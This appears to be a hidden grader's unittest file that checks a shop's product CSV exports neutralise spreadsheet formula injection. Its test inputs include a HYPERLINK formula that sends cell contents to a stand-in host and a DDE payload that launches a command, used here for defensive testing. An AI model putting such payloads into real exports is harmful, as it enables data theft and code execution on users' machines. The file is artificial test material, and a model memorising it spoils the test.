import csv
import io
import unittest

from shop.reports import products_csv
from hidden.helpers import login, make_shop


def name_cell(text, sku):
    for row in csv.reader(io.StringIO(text)):
        if row and row[0] == sku:
            return row[1]
    raise AssertionError("product %s missing from export" % sku)


class Rules(unittest.TestCase):
    def check(self, names):
        s, _, _ = make_shop()
        for i, name in enumerate(names):
            s.catalog.add("X-%02d" % i, name, 100)
        for text in (products_csv(s.catalog), s.api.export_products(login(s, "root"), {})[1]["csv"]):
            for i, name in enumerate(names):
                cell = name_cell(text, "X-%02d" % i)
                # Accepted: the cell is neutralised by a leading single quote and still carries
                # the original text after it. Rejected: the cell still starts with the trigger
                # character, or the text was dropped/mangled.
                self.assertTrue(cell.startswith("'"), "cell %r for name %r is not neutralised"
                                % (cell, name))
                self.assertIn(name, cell, "original text lost: %r -> %r" % (name, cell))

    def test_formula_trigger_characters_neutralised(self):
        """V1.2.10: a name starting with = + - @ must not reach the spreadsheet as a formula."""
        self.check(['=HYPERLINK("http://x.example/?"&A1,"Click")', "+1+cmd|' /C calc'!A0",
                    "-2+3", "@SUM(1,2)"])

    def test_tab_and_nul_leading_characters_neutralised(self):
        """V1.2.10: a name starting with a tab or a NUL character is escaped the same way."""
        self.check(["\t=1+1", "\x00=1+1"])


if __name__ == "__main__":
    unittest.main()
